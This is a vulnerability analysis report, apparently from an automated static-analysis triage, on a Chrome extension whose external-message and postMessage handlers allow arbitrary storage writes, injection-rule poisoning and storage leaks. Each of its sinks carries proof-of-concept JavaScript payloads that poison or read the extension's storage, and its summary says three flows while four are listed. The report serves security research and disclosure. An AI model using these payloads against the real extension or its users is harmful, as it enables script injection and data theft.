# CoCo Analysis: nadolkfegenlojghpmbefbikifpfcgmj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 unique flows (storage poisoning via external messages, storage leakage via sendResponse, storage leakage via postMessage)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink (addInjectionRule)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nadolkfegenlojghpmbefbikifpfcgmj/opgen_generated_files/bg.js
Line 1058: injectionRules.push(request.rule);

**Code:**

```javascript
// Background script (bg.js) - Line 1013-1130
function onMessageHandler(request, sender, sendResponse) {
    if (request) {
        if (request.event == 'addInjectionRule') {
            injectionRules.push(request.rule); // ← attacker-controlled
            chrome.storage.local.set({ 'injectionRules': injectionRules }, function () {
            });
        }
        else if (request.event == 'addIgnoreXFrameRule') {
            iframeOptionsRules.push(request.rule); // ← attacker-controlled
            chrome.storage.local.set({ 'iframeOptionsRules': iframeOptionsRules }, function () {
            });
        }
        else if (request.event == 'setAppUrl') {
            chrome.storage.local.set({ 'appUrl': request.url }, function () { // ← attacker-controlled
            });
        }
        else if (request.event == 'setStorage') {
            chrome.storage.local.set({ [request.key] : request.value }, function () { // ← attacker-controlled
            });
        }
    }
    return true;
};

// Line 1134
chrome.runtime.onMessageExternal.addListener(onMessageHandler);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From b2bsoft.com (whitelisted domain) or any extension
chrome.runtime.sendMessage('nadolkfegenlojghpmbefbikifpfcgmj', {
    event: 'setStorage',
    key: 'malicious_key',
    value: 'attacker_data'
});

// Or poison injection rules
chrome.runtime.sendMessage('nadolkfegenlojghpmbefbikifpfcgmj', {
    event: 'addInjectionRule',
    rule: { url: 'https://victim.com', script: 'malicious_script.js' }
});
```

**Impact:** Storage poisoning vulnerability. External attacker (from whitelisted b2bsoft.com domain or any malicious extension) can write arbitrary data to extension storage, including injection rules and app URLs.

---

## Sink 2: storage_local_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nadolkfegenlojghpmbefbikifpfcgmj/opgen_generated_files/bg.js
Line 752: 'key': 'value'

**Code:**

```javascript
// Background script (bg.js) - Line 1083-1094
else if (request.event == 'getStorage') {
    chrome.storage.local.get(request.key, function (res) { // ← attacker controls request.key
        var storeValue = res && res[request.key];
        sendResponse({ data: storeValue }); // ← leaks storage data back to attacker
        if(!request.skipResponse){
            sendResponse({ data: storeValue });
        }
        chrome.tabs.sendMessage(sender.tab.id, { action: "getStorage-message", extensionId: chrome.runtime.id, data: storeValue },
            function (response) {
        });
    });
}

// Line 1134
chrome.runtime.onMessageExternal.addListener(onMessageHandler);
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From b2bsoft.com (whitelisted domain) or any extension
chrome.runtime.sendMessage('nadolkfegenlojghpmbefbikifpfcgmj', {
    event: 'getStorage',
    key: 'appUrl'
}, function(response) {
    console.log('Stolen data:', response.data);
});

// Or leak injection rules
chrome.runtime.sendMessage('nadolkfegenlojghpmbefbikifpfcgmj', {
    event: 'getStorage',
    key: 'injectionRules'
}, function(response) {
    console.log('Stolen injection rules:', response.data);
});
```

**Impact:** Information disclosure vulnerability. External attacker can read arbitrary keys from extension storage and receive the data via sendResponse, including sensitive configuration like injection rules, app URLs, and any stored values.

---

## Sink 3: cs_window_eventListener_message → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nadolkfegenlojghpmbefbikifpfcgmj/opgen_generated_files/cs_0.js
Line 473: window.addEventListener("message", function (event) {
Line 477: if (event.data.extensionId && event.data.extensionId == chrome.runtime.id)

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nadolkfegenlojghpmbefbikifpfcgmj/opgen_generated_files/bg.js
Line 1058-1080: Storage write operations

**Code:**

```javascript
// Content script (cs_0.js) - Line 473-481
window.addEventListener("message", function (event) {
    if (event.source != window)
        return;

    if (event.data.extensionId && event.data.extensionId == chrome.runtime.id) {
        console.log(event.data);
        chrome.runtime.sendMessage(event.data); // ← forwards to background
    }
}, false);

// Background handles the same storage operations as Sink 1
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage

**Attack:**

```javascript
// From any webpage where content script runs (http://*/* or https://*/*)
window.postMessage({
    extensionId: 'nadolkfegenlojghpmbefbikifpfcgmj',
    event: 'setStorage',
    key: 'malicious_key',
    value: 'attacker_payload'
}, '*');

// Or read storage
window.postMessage({
    extensionId: 'nadolkfegenlojghpmbefbikifpfcgmj',
    event: 'getStorage',
    key: 'injectionRules'
}, '*');
```

**Impact:** Complete storage exploitation chain. Attacker on any webpage can both poison extension storage (setStorage, addInjectionRule) and leak stored data back via the getStorage-message action sent to content script, which can forward it to the attacking webpage.

---

## Sink 4: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nadolkfegenlojghpmbefbikifpfcgmj/opgen_generated_files/bg.js
Line 752: 'key': 'value'

**Code:**

```javascript
// Background script (bg.js) - Line 1083-1094
else if (request.event == 'getStorage') {
    chrome.storage.local.get(request.key, function (res) {
        var storeValue = res && res[request.key];
        sendResponse({ data: storeValue });
        if(!request.skipResponse){
            sendResponse({ data: storeValue });
        }
        chrome.tabs.sendMessage(sender.tab.id, {
            action: "getStorage-message",
            extensionId: chrome.runtime.id,
            data: storeValue  // ← leaked storage data
        }, function (response) {
        });
    });
}

// Content script (cs_0.js) - Line 483-489
chrome.extension.onMessage.addListener(function (msg, sender, sendResponse) {
    console.log(msg);
    if (__injected) {
        window.postMessage(msg, '*'); // ← leaks to webpage
        sendResponse({});
    }
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage combined with chrome.runtime.sendMessage

**Attack:**

```javascript
// From any webpage where content script runs
// First, trigger injection (implementation detail depends on extension logic)
// Then request storage data
window.postMessage({
    extensionId: 'nadolkfegenlojghpmbefbikifpfcgmj',
    event: 'getStorage',
    key: 'injectionRules'
}, '*');

// Listen for leaked data
window.addEventListener('message', function(event) {
    if (event.data.action === 'getStorage-message') {
        console.log('Stolen storage data:', event.data.data);
    }
});
```

**Impact:** Information disclosure via postMessage. Storage data flows back to attacker-controlled webpage through window.postMessage, creating a complete read primitive for extension storage.
